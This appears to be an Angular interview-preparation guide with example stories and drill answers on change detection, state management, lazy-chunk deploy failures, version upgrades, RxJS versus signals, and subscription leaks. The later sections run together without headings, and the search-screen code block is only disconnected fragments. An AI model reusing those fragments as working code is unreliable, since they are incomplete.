01The list that repainted on every keystroke

tier · senior performance problem diagnosed

EXAMPLE — replace with your own

The report was three words long: "typing feels laggy". The screen was an operations console with a filter box above a table of roughly 900 rows, and typing into the filter produced about 180 ms of dead time per character on a mid-range laptop — fine on my machine, unusable on the machines the actual users had. Lighthouse was green because the page loaded fast; the problem was interaction, so the number that mattered was INP, and field data put us at 420 ms at p75, well past the 200 ms "good" threshold. The first thing I did was stop talking about "the table" and start talking about which frame was busy.

Angular DevTools' profiler answered that in one recording. A single keystroke produced a change-detection cycle of about 160 ms, and the flame chart was not dominated by one slow component — it was 900 shallow bars. Every row component was being checked, every row was re-rendering its child badge and date-format pipes, and the whole thing ran again on the next keystroke. That is the classic shape of default change detection in a zone-based application: zone.js monkey-patches addEventListener, timers and XHR, so when the input event fires, Angular ticks and — under the old Default (now Eager) strategy — walks the entire component tree from the root re-evaluating every template binding. The list was not slow because rendering is slow; it was slow because we were asking Angular to prove that nothing else on the page had changed, 900 times, per character.

There were three distinct amplifiers and I fixed them in the order of how much each bought. The first was the filter itself: it was a getter on the component, get visible() { return this.rows.filter(...) }, called from the template. A template binding that calls a function runs on every check, and the function allocated a new array each time, so every row also got a new object identity. Moving that to a computed() over signals meant the filter ran once per actual input change rather than once per check, and returned a stable reference in between. The second was the row identity: @for requires a track expression, and ours was tracking the item object, which the filter had just re-allocated, so Angular destroyed and recreated all 900 DOM subtrees on each keystroke. Tracking row.id dropped that to zero DOM churn when the visible set was unchanged. The third was the two impure pipes inside each row; I replaced them with values precomputed in the same computed().

// before: getter called on every check, new array + new identities each time
@Component({
  selector: 'op-console',
  template: `
    <input [(ngModel)]="query">
    @for (row of visible; track row) {          <!-- tracking the object identity -->
      <op-row [row]="row"></op-row>
    }
  `,
})
export class OpConsole {
  query = '';
  rows: Row[] = [];
  get visible() { return this.rows.filter(r => r.name.includes(this.query)); }
}

// after: signals + computed, stable identity, track by a real key
@Component({
  selector: 'op-console',
  // v22: OnPush is the default; before v22 you wrote changeDetection: ChangeDetectionStrategy.OnPush
  template: `
    <input [value]="query()" (input)="query.set($any($event.target).value)">
    @for (row of visible(); track row.id) {
      <op-row [row]="row"></op-row>
    }
  `,
})
export class OpConsole {
  readonly query = signal('');
  readonly rows = signal<Row[]>([]);
  readonly visible = computed(() =>
    this.rows().filter(r => r.name.includes(this.query())));
}

Together those took the per-keystroke cycle from about 160 ms to 6 ms, and field INP at p75 from 420 ms to 90 ms over the following two weeks. The part I want to be honest about is that I nearly shipped a debounce instead. Debouncing the filter by 250 ms would have made the typing feel smooth and left every one of the three real problems in place, so the next feature on that page would have re-introduced the lag. Debounce hides a cost; it does not remove one.

The trade-off worth naming out loud is how you decide which lever to reach for, because candidates tend to name all four and rank none:

What I would do differently: I would have had the number before the complaint. We measured LCP because that is what the performance dashboard shipped with, and LCP is exactly the metric that says nothing about a console people keep open for eight hours. I now put INP from real-user monitoring on the first dashboard, segmented by route, and I treat "a function call in a template binding" as a review-blocking comment rather than a style preference — on Angular 22, where OnPush is the default, the tree is smaller but a getter in a binding still runs on every check of that component.

What the interviewer is really probing

Whether you understand when Angular decides to re-render, or whether you just know a list of optimisation tricks. The signal they want: you measured before you touched anything, you named the mechanism (zone-driven tick, tree-wide check, identity churn in @for), and you fixed causes in order of payoff. Bonus signal if you can say what changed in the framework — OnPush by default in v22, zoneless by default for new apps since v21 — without being asked.

The mistake candidates make on this archetype is a shopping list: "we added OnPush, trackBy, virtual scroll and lazy loading" with no diagnosis and no attribution, which tells the interviewer you changed four things and do not know which one worked. The other one is quoting a lab number (Lighthouse) for an interaction problem. Name the metric, give before and after, and say how long it took to confirm in the field.

(c) Recall prompts — find your own version

When did you last watch an Angular screen behave differently on a user's machine than on yours?

Hint: your laptop is four times faster than the median device and has a warm cache. Look for the first time someone said "it's fine for me" in a thread. What was the device, and how did you get a number off it — DevTools CPU throttling, a field metric, or someone screen-recording?

What is the worst change-detection cycle you have personally profiled, and what was in it?

Hint: open Angular DevTools on something you own and record one interaction now, before the interview. If the old number is gone, remember the shape: one fat bar (a genuinely slow component) or a thousand thin ones (a tree-wide check). Being able to say which shape you saw is itself a strong answer.

Have you ever fixed a bug caused by the wrong track or trackBy?

Hint: the symptoms are recognisable — inputs losing focus mid-typing, checkbox state jumping to the wrong row, animations restarting, scroll position resetting. Any of those is a track story, even if you did not know that at the time.

Where in a screen you own does a template binding still call a function?

Hint: getters, *ngIf="hasPermission()", impure pipes, .filter() or .sort() inline in a template. Naming a place you have not fixed yet reads as maturity, provided you also say what you would replace it with — a computed(), or a value calculated once when the input changes.

Which performance change did you ship that turned out not to matter?

Hint: everyone has one — a memoisation nobody needed, an OnPush on a leaf that was never checked anyway, a virtual scroll on 40 rows. Interviewers rate a candidate who measured and discovered they were wrong above one whose every optimisation was a triumph.

(d) Follow-up drill chain

Why is OnPush faster? What is it actually skipping?

It changes which components Angular checks, not how fast checking is. Under the eager strategy a tick walks the whole tree and re-evaluates every binding; under OnPush a component is checked only when one of its inputs changes by reference, an event fires inside it, an async pipe or a signal it reads emits, or someone calls markForCheck(). So the win is pruning: on our console the checked set went from every row to the rows whose input actually changed. The cost is that mutating an object in place — pushing to an array you already passed as an input — no longer updates the view, which is why OnPush and immutable-or-signal data belong together. Since Angular 22 this is the default, with an automatic migration that adds changeDetection: ChangeDetectionStrategy.Eager to existing components so nothing silently breaks on upgrade.

Would going zoneless have fixed this on its own?

No, and that is the interesting part. Zoneless removes the trigger — nothing patches the browser API, so an unrelated setTimeout or a resolved promise no longer schedules a tick — but our tick was triggered by a real user input on a real signal, so it would still have run. What zoneless changes is the noise floor and the bundle: no zone.js (about 12 kB gzipped), cleaner stack traces, and no accidental ticks from third-party libraries. The work inside the tick is the same, and that work was the problem. It has been the default for new applications since v21, and I would still have had to fix the getter and the track.

At what scale does your fix stop working?

Around the point where the DOM itself becomes the cost rather than the checking. With signals and correct tracking, 900 rows costs a few milliseconds; at roughly 3,000–5,000 rows on a mid-range machine you feel the layout and paint even when Angular does almost nothing, because the browser is still styling tens of thousands of elements. Past that the answer is not another Angular lever, it is fewer DOM nodes — CDK virtual scrolling, or moving filtering and paging to the server so the client never holds the full set. The other wall is data volume rather than row count: if the filter runs over a megabyte of objects per keystroke, the computed() is now the slow part and it belongs in a web worker or an index.

What did you trade away?

Two things. Signals plus OnPush mean the team can no longer mutate shared objects in place and expect the view to catch up, which is a genuine change in how people write code and it bit us twice in the first month — both times a service pushed into an array and nothing rendered. I mitigated it by making the store return readonly types so the mistake is a compile error rather than a rendering mystery. The second trade is that the computed() re-runs the whole filter on every keystroke, which is fine at 900 rows and wrong at 100,000; I left a comment saying exactly that, with the row count at which it should become server-side, so the next person does not have to rediscover the limit.

How did you know which of the three changes actually moved the number?

I shipped them as three commits behind the same release and profiled after each, because otherwise the story is superstition. The track fix alone took the cycle from 160 ms to about 55 ms — that was the DOM churn. The computed() took it to about 12 ms. Removing the impure pipes took it to 6 ms, which was the smallest win and the one I would have guessed was biggest. Being wrong about the ranking is exactly why you measure between steps rather than at the end.

How would you stop this regressing next quarter?

Three guards, cheapest first. A lint rule against function calls in template bindings, which catches the most common cause at review time. A budget in angular.json so a bundle jump is a failed build rather than a discovery. And a scripted interaction in CI that types into the filter and asserts the total scripting time stays under a threshold, run on throttled CPU so it reflects a real device. None of those catch everything, but the combination turns a recurring investigation into a failing check, which is the actual deliverable — the 6 ms was temporary, the guard is not.

02NgRx or a signal store

tier · principal hard architectural trade-off

EXAMPLE — replace with your own

We were about eighteen months into a back-office application — around 140 components across six lazy feature areas, nine engineers, two of them contractors on six-month rotations — and state management had become the thing every design discussion collapsed into. Half the codebase used NgRx with actions, reducers, effects and selectors; the other half, written after signals stabilised, used plain injectable services holding signal() fields. Neither half was wrong. The problem was that a new engineer had to learn both, and features that spanned the boundary had state living in two shapes at once, which is where the real bugs were.

I refused to make it a taste argument, because taste arguments in a nine-person team are decided by whoever is loudest. Instead I wrote down what state we actually had and sorted it into three buckets, because the honest answer is that "state management" is at least three different problems. Server cache — data we fetch, display and refetch, which is roughly 70% of everything and wants request deduplication, loading and error states, and invalidation. Local UI state — which panel is open, what the filter says: owned by one component, dies with it. Shared client state — the current tenant, feature flags, the multi-step wizard that spans four routes, the optimistic edit queue. Only the third bucket is what NgRx is genuinely for, and it was under 10% of our state.

That reframing made the decision tractable. For the server cache we adopted the async reactivity APIs, which went stable in Angular 22: httpResource() for the common read path and rxResource() where we needed real RxJS operators for a stream. A resource gives you value, status, error and isLoading as signals, re-runs when a signal its request depends on changes, and cancels the in-flight request when it does — which is precisely the loading-flag-and-race-condition boilerplate that half our effects existed to hand-roll. For local UI state, plain signals in the component. For shared client state, a small store built on signal plus computed, with NgRx SignalStore where a feature genuinely wanted the extra structure. We kept classic NgRx in exactly one place: the offline edit queue, where we needed a serialisable action log to replay and to debug from a customer's exported session.

// server cache: no reducer, no effect, no loading flag to forget
@Injectable({ providedIn: 'root' })
export class OrdersApi {
  private readonly tenant = inject(TenantStore).current;   // a signal
  readonly page = signal(1);

  // re-fetches whenever tenant() or page() changes; cancels the previous request
  readonly orders = httpResource<Order[]>(() =>
    `/api/tenants/${this.tenant().id}/orders?page=${this.page()}`);
}

// in the template
// @if (orders.isLoading()) { <app-spinner /> }
// @else if (orders.error()) { <app-error [err]="orders.error()" /> }
// @else { @for (o of orders.value() ?? []; track o.id) { ... } }

The migration was deliberately partial and that was the hardest thing to hold the line on. We did not rewrite the NgRx half; we froze it, wrote down that new features use the new shape, and converted an area only when it was being substantially changed anyway. Fourteen months later about 80% of the application is signal-based, three feature areas still run NgRx, and nobody has been blocked by the mixture — because the rule is unambiguous about which shape a new file uses. The measurable outcomes were a drop of roughly 4,500 lines of state plumbing, a new-joiner's first meaningful pull request going from about eleven days to five, and, less expected, a real reduction in a class of bug: stale-response races disappeared, because a resource cancels rather than letting a slow first request overwrite a fast second one.

What I would do differently: I would have written the three-bucket rule two years earlier, as a one-page decision record, rather than after the split had grown. The decision itself was not hard once the buckets were named; the expensive part was the eighteen months in which every engineer answered the question independently. I also under-invested in the migration guide for the contractors — the rule was clear to the people who had been in the room and folklore to everyone else, which is a failure of writing, not of design.

What the interviewer is really probing

Whether you can hold two credible options in mind and decide on criteria rather than fashion — and whether you understand that "state management" is several problems wearing one name. The signal they want at staff and above: you reframed the question, you scoped the decision (partial migration, frozen boundary), you named what you kept and why, and you can say what would make you choose differently.

The mistakes here are predictable. One is advocacy: "NgRx is boilerplate" or "signals don't scale" delivered as a fact, which reads as someone who has used one thing. Another is the total-rewrite answer, which tells the interviewer you optimise for tidiness over risk. The third is having no cost at all in the story — a trade-off with no downside was not a trade-off.

(c) Recall prompts — find your own version

Where in a codebase you know do two legitimate approaches coexist?

Hint: it does not have to be state management — forms (reactive vs. template-driven vs. Signal Forms), HTTP (services vs. resources), styling, testing. The story is the same shape: two right answers, one team, and the cost of the ambiguity.

What is a piece of state in your app that lives in the wrong place?

Hint: server data cached in a global store "so we only fetch it once", or a wizard's state in a component that gets destroyed on navigation. Both are common and both make good stories, because you can explain the bug the wrong location caused.

When did you choose the more boring option deliberately?

Hint: keeping NgRx in one place, staying on a library the team knows, not adopting the new API in the quarter it shipped. Interviewers at lead level are specifically listening for whether you can resist a rewrite, so this prompt is worth having a real answer to.

Have you ever written a decision record that someone else later used to argue against you?

Hint: that is a good outcome and a strong story — it means the criteria were real. What did they cite, and was the criterion wrong or the situation different?

(d) Follow-up drill chain

Why not just move everything to signals and delete NgRx entirely?

Because one of our features genuinely needed what NgRx provides and nothing else did it as well: a serialisable, replayable log of intent. The offline edit queue has to survive a page reload, be replayed in order against a server that may reject some entries, and be exportable so support can reproduce a customer's state. That is an action log, and reducers plus a persisted store are the right tool. Deleting it would have bought consistency and cost us the debuggability of the one feature where we needed it most. I would rather defend one deliberate exception with a written reason than a uniform codebase that is slightly wrong in the hard place.

At what team size or app size does your choice flip?

Two axes. On team size, ad-hoc signal services start to hurt somewhere around fifteen or twenty engineers touching shared state, because the thing NgRx really sells is not performance but constraint — you cannot mutate state from anywhere when the only path is an action. Below that, the constraint costs more than it saves. On state complexity, the flip is not size but shape: the moment you need undo, replay, an audit trail or optimistic updates with rollback across several features, a store with explicit transitions wins regardless of team size. What does not flip it is data volume — 70% server cache stays server cache at any scale, and putting it in a global store is a mistake that gets worse as you grow.

How did you get nine people to agree, including the two who wrote the NgRx half?

By making it about the buckets rather than the libraries, which took the personal stake out of it — nobody defends "NgRx for local UI state" once it is written on a whiteboard next to the alternative. I asked the strongest NgRx advocate to own the inventory, so the evidence came from him rather than from me, and he was the one who found that 70% of it was server cache. Then I committed publicly to not rewriting his code, which removed the real fear. The two things I would repeat: give the person you are disagreeing with the job of gathering the evidence, and separate "what we build next" from "what we rewrite" explicitly, because people conflate them and argue about the wrong one.

What did you trade away?

Consistency, on purpose, for about two years — a new engineer still meets both shapes and needs a paragraph of explanation. We also lost NgRx DevTools time-travel in the converted areas; Angular 22 exposes the signal graph and the DI graph in Chrome DevTools, which covers most of what we used it for, but stepping backwards through actions is genuinely gone. And httpResource is not a cache: two components asking for the same URL make two requests, so we had to hoist shared resources into a service deliberately rather than getting deduplication for free. I would rather name that limit than pretend the new API is strictly better.

How would you tell in six months whether this was the right call?

I picked the measures up front so I could not move the goalposts: time from a new engineer's start to their first meaningful pull request, the number of state-related defects per quarter, and how often a design review spent time on where state should live. The first two moved (eleven days to five; race-condition bugs effectively gone); the third is the one I watch, because if people are still asking the question then the rule is not clear enough. I would call it wrong if we had shipped the same defect rate with less structure, or if the frozen NgRx areas had become unmaintainable — neither happened, but both were plausible.

What would you do differently on a greenfield Angular 22 app today?

Start with the three buckets from day one and reach for a library only when a bucket outgrows the primitives. Concretely: httpResource for server reads, component signals for UI state, one hand-written signal store per bounded feature, and Signal Forms — stable since v22 — for anything form-shaped, because that removes another whole category of state I used to keep in a store. I would still write the decision record in week one, and I would still leave the door open to NgRx, because the honest position is that it earns its place in a specific and recognisable situation rather than never.

03The chunk that 404'd after every deploy

tier · staff production incident / outage

EXAMPLE — replace with your own

The alert was a spike in a client-side error we had been ignoring for months: ChunkLoadError: Loading chunk 47 failed. It had always been a background hum of a few dozen a day. On this afternoon it was 3,100 in twenty minutes, and support was taking calls from users who clicked "Reports" and got a blank page with a spinner that never resolved. The application was up. The API was healthy. Every dashboard I owned was green, which is the most disorienting kind of incident.

The mechanism is worth spelling out because it is entirely a consequence of how Angular ships a lazy route. The router loads a feature with loadComponent or loadChildren, which compiles to a dynamic import() of a content-hashed file such as chunk-K4XQ2P7A.js. The index.html a user loaded at 09:00 contains the hashes from the 09:00 build. We deployed at 14:20; the build produced new hashes, and our deploy step synced the new dist to the bucket with delete, removing the old files. Every user with the morning's tab still open was now holding an index.html that referenced chunks which no longer existed. They were fine until they navigated to a route they had not visited yet — and then the dynamic import 404'd. It was not a bad deploy. It was a normal deploy meeting a long-lived tab, and it had been happening at low volume for months; this time we shipped at 14:20 on a weekday instead of at night, so thousands of people had tabs open.

I ran it in three phases. Mitigate: I re-uploaded the previous build's hashed assets alongside the new ones — a two-minute copy from the artefact store — and the error rate fell to baseline within about four minutes, because the old index.html could now resolve its chunks again. Contain: we changed the deploy to stop deleting, and set a retention window so hashed assets survive for 30 days; since they are content-hashed and served immutable, keeping them costs a few hundred megabytes and nothing else. Fix properly: the deeper problem was that a user could be running a build we no longer serve and had no way to find out. We added a version check — the app polls a tiny version.json every five minutes and on regaining focus, and when it changes it shows a non-blocking "a new version is available, reload" bar. And we added a router-level recovery so that even in the window before that bar appears, a failed lazy load reloads the page onto the intended URL instead of dying.

// last line of defence: a lazy chunk that 404s should reload, not blank the page
export const routes: Routes = [
  {
    path: 'reports',
    loadComponent: () =>
      import('./reports/reports.page').then(m => m.ReportsPage)
        .catch((err) => {
          // a stale index.html referencing a deleted chunk; reload onto the target URL
          if (isChunkLoadError(err) && !sessionStorage.getItem('reloaded-for-chunk')) {
            sessionStorage.setItem('reloaded-for-chunk', '1');
            location.assign(location.pathname + location.search);
          }
          throw err;                        // otherwise let the ErrorHandler see it
        }),
  },
];

The guard against a reload loop matters more than it looks: without the sessionStorage flag, a genuinely broken deploy turns into an infinite refresh across every open tab, which converts a degraded route into a self-inflicted denial of service against your own origin. We tested that path deliberately by deleting a chunk in a staging bucket. Angular 22's @boundary block gives you a cleaner in-template version of the same idea for component-level failures, and we later used it to render a "this panel could not load" card instead of taking the page down; the router-level reload is still what handles the stale-index case, because there is nothing to render if the code never arrives.

(d) Follow-up drill chain

Why did the old index.html still exist? Should it not have been cached differently?

It was not a caching mistake — the caching was right. Hashed chunks are served immutable with a long max-age and index.html is served no-cache, which is the correct pairing. The index.html in play was not a cached copy on a CDN; it was the one already parsed inside a browser tab that had been open since morning. No cache header reaches a document that has already loaded. That is the insight the incident turned on: the moment you ship lazy chunks, your deploy has to consider clients that are already running, and the only two honest strategies are keeping old assets around or telling the client to reload.

Why not use a service worker and be done with it?

Because it moves the problem rather than removing it, and it adds a lifecycle that is genuinely hard to reason about. @angular/pwa with SwUpdate does solve the consistency problem well — the worker pins a whole app version, so a tab never mixes builds — but you then own cache invalidation, an update prompt anyway, and the failure mode where a bad worker is sticky on users' devices and cannot be pushed a fix quickly. For an internal-facing tool with no offline requirement that was a large amount of new surface for one bug. I would choose it if we needed offline or install, and in that case I would still keep old assets, because a worker does not help the first load after a stale bootstrap.

At what point does your 30-day asset retention stop being enough?

Two limits. If you deploy many times a day, 30 days of hashed assets is thousands of files — still trivial in storage terms, but the bucket listing and the sync step get slow, so at that rate you want retention by count rather than by date. The harder limit is behavioural: retention only protects tabs younger than the window, and we had users whose tabs lived for weeks. Retention is a grace period, not a solution — the actual solution is the version check that tells a long-lived tab it is stale. If I had to keep one of the two, I would keep the version check.

What did you trade away?

Mainly the certainty of what code a given user is running. Keeping old assets means a stale tab keeps working happily on a build that may contain a bug we have already fixed, and our error tracker now has to report the build hash to make triage possible — we added that in the same change, because without it "cannot reproduce" becomes the default outcome. The reload recovery also loses unsaved state, which is why it is the last layer rather than the first, and why we do not use it on the routes that hold long forms; there, the version banner is the whole mechanism.

How did you decide it was safe to change the deploy mid-incident?

I did not change the deploy mid-incident. The mitigation was a pure copy — re-uploading files that had existed twenty minutes earlier, additive, no deletions, instantly reversible by deleting them again. The deploy-pipeline change went through review the next morning. That distinction is the one I would want an interviewer to hear: during an incident you take the smallest reversible action that restores service, and you do not fix the system while it is on fire. The postmortem is where the pipeline change belongs, along with the argument about whether we needed the version check at all.

What would you build first if you were designing this from scratch on Angular 22?

The version check, before anything else, because it is the mechanism that makes every other layer optional. Then immutable hashed assets with retention by count. Then, at the component level, @boundary blocks around independently-loaded panels so one failed lazy load degrades a card rather than a page — that is new in v22 and it is the piece I most wish I had had, since half the blank screens in this incident were a dashboard where one widget's chunk failed and took the route down with it. I would leave the router-level reload in as the floor, and I would write the loop guard first, not second.

We inherited an Angular 14 application that had not been updated in about three years: 240 components, 61 NgModules, 34 direct dependencies, a Karma test suite of 1,900 specs, and a webpack-based build taking eleven minutes. The single most important decision was to go one major at a time and deploy each one, rather than jumping to the latest. Angular's upgrade path is designed around that: ng update ships schematics per version that rewrite your code, and they assume you arrive from the immediately previous major. Skipping majors means the schematics do not apply and you hand-write what a migration would have done for free. So it was ng update @angular/core@15 @angular/cli@15, run the suite, deploy, repeat — fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty, twenty-one, twenty-two. (d) Follow-up drill chain

Why one major at a time? Defend it against jumping straight to 22.

Because the migration schematics are the product. ng update ships codemods per version that assume you are arriving from the previous major — the control-flow migration in v17, the standalone migration in v15 and v16, the inject() and signal-input migrations, the Karma-to-Vitest migration in v22. Jump the queue and you write all of that by hand across 240 components with no test of the transformation itself. The second reason is blast radius: each hop was a reviewable pull request that could be reverted in one command, and the one that broke production (a router change in v18 that altered guard timing) was found and rolled back in twenty minutes because it was the only thing in that deploy. I would only jump majors for a small app with strong tests and no parallel feature work.

What broke that the migrations did not catch?

Three things, and they were all at boundaries the codemods cannot see. First, third-party components compiled against an older Angular — two libraries had no compatible release, so we vendored one for six weeks and replaced the other. Second, behaviour rather than API: a guard that used to run before a resolver started running after it, which no test covered because the test asserted the end state. Third, our own abuse of private APIs — someone had reached into ɵ-prefixed internals for a scroll-restoration hack in 2021, and that is exactly the kind of thing that has no migration path and no sympathy. I now treat a ɵ import as a review-blocking finding with a written expiry date.

At what codebase size does this approach break down?

The per-major cost scales with the number of templates and dependencies, not with the number of engineers, so the schematic-driven part holds up well — a 2,000-component monorepo mostly means the migrations run for a minute instead of a second. What breaks down is the human coordination: at that size you cannot freeze the codebase for a codemod that touches every template, so you need to run migrations per library or per project and merge them separately, and you need the migration commit to be mechanically verifiable so reviewers do not have to read 4,000 files. Past a few hundred engineers, the honest answer is that you build tooling to do this continuously rather than as a project — a bot that opens the upgrade PR the week a version ships, so you are never more than one major behind.

What did you trade away?

Nine weeks of one engineer's feature capacity, which was the visible cost and the one I negotiated for. The invisible one is that we arrived on v22 running old idioms: the code compiles as modern Angular and reads as 2022 Angular in places, because a codemod converts syntax and not design. Every component still has an explicit Eager change-detection line the v22 migration added, and paying that down is a separate backlog with about 240 items in it. I chose that deliberately — I would rather be current and idiomatically behind than idiomatic and three years out of support — but I would not let anyone claim the migration "modernised" the codebase. It made modernising possible.

How did you keep nine people shipping features through it?

By making each hop small enough to land in a day and scheduling it against the team's rhythm rather than against mine: the upgrade PR went up Monday morning, and the rule was that it merged by Tuesday or was reverted, so nobody ever rebased onto a half-migrated codebase for more than a day. Codemod commits were kept separate from hand-written fixes in the same PR, so reviewers could skim the mechanical one and read the small one. And I published the version we were on, in the team channel, every Friday. The thing I would repeat is the merge-or-revert deadline — it converts an open-ended risk into a bounded one and it makes the decision to revert emotionally cheap.

You are now on v22. When do you go to v23, and how do you stop this happening again?

Within a month of each release, as routine work rather than a project — Angular ships a major roughly every six months, so the recurring cost of staying current is one or two days twice a year against nine weeks of catch-up. Concretely: a scheduled job opens the ng update pull request when a major lands, the upgrade runs against the full suite in CI, and being more than one major behind is treated as an incident-level backlog item with an owner. I would also name the dependency risk explicitly — the reason we fell behind was two third-party components without maintained releases, so I now check "does this library ship a release within a month of an Angular major" before adopting anything that compiles against the framework.

The pull request was a search screen: a text input, three filter dropdowns, a results list and paging. I had written it with signals — a computed() assembling the query object and an httpResource() keyed off it — and a senior colleague, one of the strongest engineers on the team and the person who had built most of our RxJS conventions, left a long review saying it should be a combineLatest pipeline with debounceTime, distinctUntilChanged and switchMap. He was right about the first point and, as it turned out, wrong about the second — but I did not know that yet, and the review thread was three rounds deep and getting terse.

I stopped replying in the thread. Two rounds is my limit for a disagreement about design; past that, text amplifies tone and nobody updates their position. I asked for twenty minutes on a call and opened with what I thought his strongest point was, in my own words: reading my code, you cannot see the race-condition policy, and on a search box the race condition is the entire feature. That reframing changed the conversation, because we then had one question — what is the cancellation behaviour — instead of two people defending toolkits.

The answer is worth knowing precisely, because it is exactly what an interviewer will drill. switchMap cancels the previous inner observable when a new value arrives, which is why it is the correct operator for a search box and mergeMap is not; use mergeMap and a slow first request can resolve after a fast second one and overwrite the newer results. A resource() gives you the same guarantee from the other direction: when a signal in its request function changes, the previous request is aborted — the loader receives an AbortSignal, and with httpResource on Angular 22, where HttpClient uses fetch by default, that is a real network abort. So my version did have switchMap semantics; they were implicit rather than written down, and his complaint was legitimately about legibility. The debounce, though, I had simply forgotten.

  debounceTime(250),
  distinctUntilChanged(isEqual),
  switchMap(([q, s, p]) => this.http.get<Result[]>('/api/search', { params: { q, s, p } })),
  // ...and now you own loading, error and retry by hand

// what we shipped: signals for the inputs, an explicit debounce, a resource for the request

readonly page   = signal(1);

// debounced() is experimental in v22; the point is that the delay is visible in the code

  url: '/api/search',

(d) Follow-up drill chain

Why is switchMap right for a search box and mergeMap wrong?

Because switchMap unsubscribes from the previous inner observable when a new outer value arrives, so only the most recent request can deliver a result. With mergeMap every request stays alive, and if the first one is slower than the second — which happens constantly with variable-length search queries — the older, wrong results arrive last and win. concatMap is worse for this case: it queues, so a fast query waits behind a slow one and the user watches stale results for seconds. exhaustMap ignores new values while one is in flight, which is right for a submit button and wrong for typing. The general rule I give juniors: pick the flattening operator by asking what should happen to the previous request, and say the answer out loud before you type.

Do signals actually cancel the request, or do they just ignore the result?

They cancel. A resource loader is handed an AbortSignal, and when a dependency changes the previous load is aborted rather than merely discarded — with httpResource on Angular 22 that reaches the network, because HttpClient now uses fetch by default rather than XMLHttpRequest. The practical difference matters for expensive endpoints: ignoring a response still costs the server the work and the user the bandwidth. It is also the reason I would not hand-roll the equivalent with a plain effect() and an await — you get the race condition back and the abort is yours to implement.

What if he had refused to be convinced?

Then I would have separated blocking from non-blocking. He was right about the debounce, so that was going in regardless. The choice of resource versus pipeline was not a correctness issue, and I do not think a reviewer should block on a defensible design preference; if we still disagreed after the call, my next move would have been to take the general question — not this pull request — to the team and let the convention be decided by more than two people, with the PR merging in the meantime. What I would not do is escalate to a manager over a design preference; that spends credibility you need for the decisions that actually matter, and it teaches the team that disagreement is dangerous.

At what point would you tell someone to use RxJS instead of signals today?

Whenever the problem is about time rather than about state. Concretely: anything needing debounce, throttle, retry with exponential backoff, timeout-then-fallback, buffering, or reconnection; any long-lived stream such as a websocket or server-sent events; and any orchestration where the ordering of several async sources is the feature. The tell is that you find yourself writing timers or flags by hand — that is an operator you are reimplementing badly. Conversely I would push back on RxJS for anything whose only job is to hold a value a template reads, because there you are paying subscription management for nothing, and toSignal() at the boundary gets you the best of both.

How do you keep review disagreements from becoming personal on a team you lead?

Three mechanisms that are cheap and work. Separate blocking from non-blocking explicitly in the comment itself — "blocking: this races" versus "preference: I would extract this" — because most review heat comes from ambiguity about whether an opinion is a gate. A two-round rule: after two exchanges, move to a call, and make that a team norm rather than a personal escalation. And decide the recurring arguments once, in writing, so the same debate is not relitigated per pull request — that is what our one-sentence rule about state versus time was for. As the lead, the highest-leverage thing is modelling the concession publicly: if the team sees me change my mind in a thread, the cost of doing it drops for everyone.

An observable that never completes holds a reference to its subscriber; the subscriber closes over the component instance; the component instance references its host element and its whole DOM subtree. // the leak: a root-scoped Subject that never completes, subscribed and never released
export class CaseListComponent implements OnInit {
  private readonly notifications = inject(NotificationService);
  rows: Row[] = [];

  ngOnInit() {
    this.notifications.stream$.subscribe(n => this.apply(n));   // retained forever
  }
  // no ngOnDestroy - and nothing complains
}

// the fix: tie the subscription to the injection context's lifetime
export class CaseListComponent {
  private readonly notifications = inject(NotificationService);
  readonly rows = signal<Row[]>([]);

  constructor() {
    this.notifications.stream$
      .pipe(takeUntilDestroyed())        // uses the current DestroyRef; no manual teardown
      .subscribe(n => this.apply(n));
  }
}

(d) Follow-up drill chain

Why does one un-unsubscribed observable retain an entire component and its DOM?

Because the reference chain runs the wrong way from the direction people imagine. The Subject lives in a root-provided service, so it is alive for the life of the application; it holds a list of its subscribers so it can push values; each subscriber holds the closure you passed to subscribe; that closure captures this, the component instance; and the component instance references its host element, which references its entire rendered subtree. Angular destroying the component does not break that chain — destruction removes the view, it does not sever an external reference into the instance. So the DOM is detached but reachable, and detached-but-reachable is exactly what a leak is. Every navigation adds another whole page to the set.

Is it always wrong to call .subscribe() without unsubscribing?

No, and a rule that says so will be ignored within a month. A subscription to a source that completes cleans itself up: an HttpClient call completes after one response, and take(1) or first() makes any source finite. What leaks is a source that never completes — a Subject, BehaviorSubject, interval, fromEvent, a websocket, a router event stream, or a state store. That is why our lint rule allows a pipeline containing takeUntilDestroyed, take, first, or takeUntil, rather than banning subscription outright. I would rather have a rule people can satisfy honestly than one they suppress.

At what point does this become invisible again?

When the leak is small enough to hide inside normal variance. Ours was dramatic — a whole page per navigation — so a thirty-iteration loop made it obvious. A leak of a few kilobytes per interaction needs thousands of iterations before it clears the noise, and at that point a threshold-based CI check produces more false alarms than findings, which is worse than nothing because people start ignoring it. That is why our heap test runs nightly with a generous threshold: it is designed to catch the catastrophic class, not every byte. For the small class the honest answer is that you catch it by construction — takeUntilDestroyed, toSignal and the async pipe by default — rather than by measurement.

What did you trade away with the lint rule?

Some legitimate code now needs a suppression comment, and every suppression is a small tax plus an opportunity for someone to suppress a real bug. There were four genuine cases — a subscription deliberately outliving a component because it belonged to a service — and I required each to carry a one-line comment saying who owns the teardown. The bigger trade is that a rule like this creates the feeling of safety, and the two-thirds of components that were safe only because they used the async pipe are still one refactor away from the same bug. The durable fix is the default shape (signals and toSignal, where there is no subscription to forget), and the rule is scaffolding while we get there.

Would signals have prevented this entirely?

Largely, and it is worth being precise about why. A signal is pull-based: consumers read from it, so a signal does not hold a list of components to push to, and there is nothing to unsubscribe. toSignal() does subscribe under the hood but it registers teardown against the injection context's DestroyRef, so the cleanup is structural rather than remembered. Where you can still leak is anything that reaches outside Angular's lifecycle — a manual addEventListener on window, a setInterval, an IntersectionObserver, a third-party chart library that registers a resize handler. Those are the leaks I look for now, because the framework has closed the easy one and the remaining ones are all at the boundary.

How would you have found this faster?

By making session age a dimension in our real-user monitoring from the start. The bug was visible in the data we already had, if we had ever plotted interaction latency against how long a session had been open — a rising line over hours is unmistakable and needs no reproduction. That one chart would have converted a three-week rumour into a same-day investigation. The generalisable habit: when a complaint has a time dimension in it ("over time", "after a while", "by the afternoon"), the first move is to plot the metric against that dimension rather than to look at aggregates, because aggregates average exactly the effect you are hunting.

That is not an Angular problem; 216,000 cells is a browser problem, and the framework question is only how much you add on top.

I split it into three costs, because they have three different fixes and conflating them is why these projects fail. DOM cost: the browser styling, laying out and painting a quarter of a million elements. Change-detection cost: Angular checking bindings for every row on every tick. Update cost: 400 messages a second each potentially touching a row. Only the first is solved by virtual scrolling; people reach for it and are then surprised the grid is still slow.

